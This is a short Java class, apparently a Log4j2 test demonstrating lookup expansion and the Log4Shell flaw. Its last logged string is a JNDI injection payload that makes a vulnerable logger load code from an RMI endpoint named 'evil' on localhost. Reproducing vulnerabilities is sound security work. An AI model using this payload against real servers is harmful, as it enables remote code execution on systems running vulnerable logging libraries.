package com.example.logging.log4j2.cv2.service;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {

    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);


    public static void main(String[] args) {
        String name = "Jack";
        logger.info("hello, {}", name);

        String version = "${java:version}";
        logger.info("hello, {}", version);

        String vm = "${java:vm}";
        logger.info("hello, {}", vm);

        String hacker = "${jndi:rmi://127.0.0.1:1099/evil}";
        logger.info("hello, {}", hacker);
    }
}
